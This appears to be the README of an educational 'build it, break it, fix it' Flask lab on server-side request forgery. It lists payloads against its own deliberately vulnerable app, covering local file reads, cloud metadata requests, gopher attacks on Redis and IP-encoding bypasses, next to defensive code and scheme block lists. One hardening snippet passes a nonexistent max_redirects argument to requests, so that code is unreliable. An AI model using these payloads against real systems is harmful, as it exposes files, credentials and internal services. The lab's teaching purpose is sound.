# Flask SSRF Vulnerability & Protection Laboratory

## 🔍 Overview

This comprehensive educational project demonstrates **Server-Side Request Forgery (SSRF)** vulnerabilities through a "Build It, Break It, Fix It" methodology. Learn how SSRF attacks work, exploit them in realistic scenarios, and implement robust defenses.

## ⚡ Quick Start

### Prerequisites
- Python 3.7+
- Flask
- Requests

### Installation
```bash
# Clone and setup
git clone <repository>
cd ssrf-lab

# Create virtual environment
python -m venv venv
source venv/bin/activate  # Linux/Mac
# OR
.\venv\Scripts\activate  # Windows

# Install dependencies
pip install flask requests
```

## 🎯 Project Architecture

```
ssrf-lab/
├── vulnerable_app.py          # 🚨 Intentionally vulnerable application
├── secure_app.py              # 🛡️ Protected application
├── localhashboard.py          # 🏠 Internal admin dashboard
├── exploit_ssrf.py            # ⚔️ SSRF exploitation tool
├── requirements.txt           # 📦 Dependencies
└── README.md                 # 📚 This file
```

## 🚨 Vulnerable Application (`vulnerable_app.py`)

### Features
- **Unrestricted URL fetching** - No protocol validation
- **Dangerous protocol support** - `file://`, `gopher://`, `phar://`, `data://`, `dict://`
- **No IP filtering** - Access to internal networks and metadata services

### Run Vulnerable App
```bash
python vulnerable_app.py
```
Access: http://localhost:5000

### Example Exploits
```bash
# Local file reading
curl "http://localhost:5000/vulnerable-proxy?url=file:///etc/passwd"

# Internal service access
curl "http://localhost:5000/vulnerable-proxy?url=http://localhost:80/admin"

# Cloud metadata
curl "http://localhost:5000/vulnerable-proxy?url=http://169.254.169.254/latest/meta-data/"

# Gopher protocol attack
curl "http://localhost:5000/vulnerable-proxy?url=gopher://127.0.0.1:6379/_INFO"
```

## 🛡️ Secure Application (`secure_app.py`)

### Security Features
- **Protocol Whitelisting** - Only HTTP/HTTPS allowed
- **Private IP Blocking** - RFC 1918, loopback, link-local ranges
- **Domain Allow Lists** - Configurable trusted domains
- **Port Restrictions** - Only common web ports permitted
- **DNS Rebinding Protection** - Blocks bypass attempts
- **Input Validation** - Comprehensive URL parsing
- **Request Limits** - Timeouts, size limits, redirect controls

### Run Secure App
```bash
python secure_app.py
```
Access: http://localhost:5000

### Security Endpoints
```bash
# Test URL validation
curl "http://localhost:5000/validate-url?url=https://httpbin.org/json"
```

## 🏠 Internal Dashboard (`localhashboard.py`)

### Purpose
Simulates an internal admin dashboard that should not be publicly accessible.

### Run Dashboard
```bash
# Requires admin privileges for port 80
sudo python localhashboard.py  # Linux/Mac
python localhashboard.py       # Windows (as Admin)
```
Access: http://localhost:80

## ⚔️ Exploitation Tools

### Automated Exploitation (`exploit_ssrf.py`)
```bash
python exploit_ssrf.py
```
Tests multiple attack vectors:
- Internal service enumeration
- Cloud metadata access
- Protocol-based attacks
- Bypass techniques
Validates security controls:
- Allowed URL testing
- Blocked protocol verification
- Private IP blocking
- Bypass attempt detection

## 🔬 Attack Scenarios

### 1. Internal Network Reconnaissance
```http
http://localhost:5000/vulnerable-proxy?url=http://192.168.1.1/
http://localhost:5000/vulnerable-proxy?url=http://10.0.0.1:8080/
```

### 2. Cloud Metadata Exploitation
```http
http://localhost:5000/vulnerable-proxy?url=http://169.254.169.254/latest/meta-data/
http://localhost:5000/vulnerable-proxy?url=http://metadata.google.internal/
```

### 3. Dangerous Protocol Attacks
```http
file:///etc/passwd                    # Local file read
gopher://127.0.0.1:6379/_INFO         # Redis exploitation
phar:///malicious.phar                # PHP deserialization
data:text/html,<script>alert(1)</script> # XSS injection
dict://127.0.0.1:11211/stats          # Service enumeration
```

### 4. Bypass Techniques
```http
http://0177.0.0.1:80/                 # Octal encoding
http://0x7f.0.0.1:80/                 # Hexadecimal encoding  
http://2130706433:80/                 # Decimal encoding
http://127.0.0.1.nip.io:80/           # DNS rebinding
http://[::]:80/                       # IPv6 bypass
```

## 🛡️ Defense Mechanisms

### 1. Input Validation
```python
# Protocol whitelisting
ALLOWED_SCHEMES = {'http', 'https'}
BLOCKED_SCHEMES = {'file', 'gopher', 'phar', 'data', 'dict'}

# Domain allow list
ALLOWED_DOMAINS = {'httpbin.org', 'api.trusted.com'}
```

### 2. Network Security
```python
# Private IP blocking
def is_private_ip(host):
    ip_obj = ipaddress.ip_address(host)
    return (ip_obj.is_private or 
            ip_obj.is_loopback or 
            ip_obj.is_link_local)
```

### 3. Request Hardening
```python
# Security constraints
response = requests.get(
    url,
    timeout=10,           # Request timeout
    allow_redirects=True, # Controlled redirects
    max_redirects=2,      # Redirect limit
    verify=True           # SSL verification
)
```

## 📊 Impact Assessment

| Attack Vector | Impact Level | Protected |
|---------------|--------------|-----------|
| `file://` protocol | Critical | ✅ |
| `gopher://` protocol | Critical | ✅ |
| Internal service access | High | ✅ |
| Cloud metadata | High | ✅ |
| `data://` XSS injection | Medium | ✅ |
| `dict://` enumeration | Medium | ✅ |
| Network scanning | Medium | ✅ |

## 🔧 Security Recommendations

### Application Layer
1. **Input Validation**
   - Use allow lists over deny lists
   - Validate URL schemes and destinations
   - Implement strict URL parsing

2. **Network Controls**
   - Implement outbound firewall rules
   - Use network segmentation
   - Restrict internal service access

3. **Monitoring & Logging**
   - Log all external requests
   - Monitor for suspicious patterns
   - Implement rate limiting

### Infrastructure Layer
1. **Cloud Protections**
   - Use IMDSv2 (Instance Metadata Service v2)
   - Implement service mesh with egress controls
   - Use cloud security groups and NACLs

2. **Container Security**
   - Use non-root users
   - Implement network policies
   - Regular vulnerability scanning

## 🧪 Learning Objectives

After completing this lab, you will understand:

### Vulnerability Understanding
- How SSRF vulnerabilities occur in web applications
- Common attack vectors and their impact
- Real-world exploitation scenarios

### Defense Implementation
- Multi-layered SSRF protection strategies
- Input validation best practices
- Network security controls

### Security Testing
- Automated vulnerability detection
- Security control validation
- Penetration testing methodologies

## 🚀 Advanced Usage

### Custom Security Configurations
Modify `SECURITY_CONFIG` in `secure_app.py`:
```python
SECURITY_CONFIG = {
    'allowed_schemes': {'http', 'https'},
    'allowed_domains': {'your-trusted-domain.com'},
    'allowed_ports': {80, 443, 8080},
    'timeout': 15,
    'max_content_length': 5 * 1024 * 1024,
}
```

### Integration Testing
```python
# Test your applications against SSRF
from security_test import SecurityTester
tester = SecurityTester('http://your-app:5000')
tester.test_blocked_protocols()
```